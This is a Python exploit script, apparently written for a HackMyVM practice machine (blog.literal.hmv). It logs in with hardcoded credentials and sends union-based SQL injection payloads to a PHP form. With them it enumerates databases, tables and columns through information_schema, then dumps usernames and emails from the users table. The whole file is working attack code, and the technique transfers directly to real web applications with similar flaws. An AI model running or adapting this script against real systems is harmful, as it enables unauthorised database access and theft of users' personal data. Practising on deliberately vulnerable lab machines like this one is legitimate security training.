#!/usr/bin/python3

import requests
import signal
import re

# Variables

URL = "http://blog.literal.hmv"
session = requests.Session()
end_row = False

# Funciones

def exit2calle(sig, frame):  # controlamos salida forzada con Ctrl^C
    print("\nInterrupción, saliendo...\n")
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

def login():
    r = session.post(URL + '/login.php', data={"username":"lanza","password":"lanz321!"})
    if "Here are my projects and future thougths." not in r.text:
        print("(-) Fallo al iniciar sesión")
        exit(1)

def send_query(malicious_query):
    base_query = f"Done' UNION ALL SELECT CONCAT('INICIOFOUND',{malicious_query},'FINFOUND'),'b','c','d','e'-- -"
    data_post = {"sentence-query": base_query}

    r = session.post(URL + '/next_projects_to_do.php', data=data_post)
    try:
        result = re.findall(r'INICIOFOUND(.*?)FINFOUND', r.text)[0]
        print(result)
    except:
        end_row = True
        return end_row

def extract_databases():
    print("*----------------------------------- Databases")
    for row in range(0,100):
        malicious_query = f"(SELECT schema_name FROM information_schema.schemata LIMIT {row},1)"
        end_row = send_query(malicious_query)
        if end_row:
            break

def extract_tables():
    print("*----------------------------------- Tables from blog")
    for row in range(0,100):
        malicious_query = f"(SELECT table_name FROM information_schema.tables WHERE table_schema='blog' LIMIT {row},1)"
        end_row = send_query(malicious_query)
        if end_row:
            break

def extract_columns():
    print("*----------------------------------- Columns from blog.users")
    for row in range(0,100):
        malicious_query = f"(SELECT column_name FROM information_schema.columns WHERE table_schema='blog' and table_name='users' LIMIT {row},1)"
        end_row = send_query(malicious_query)
        if end_row:
            break

def extract_information():
    print("*----------------------------------- Users from blog.users")
    for row in range(0,100):
        malicious_query = f"(SELECT CONCAT(username,':',useremail) FROM blog.users LIMIT {row},1)"
        end_row = send_query(malicious_query)
        if end_row:
            break

# Control del programa

def main():
    login()
    extract_databases()
    extract_tables()
    extract_columns()
    extract_information()

# Inicio del programa

if '__main__' == __name__:
    print("\n(+ SQLI Union-Based in blog.literal.hmv +)\n")
    main()
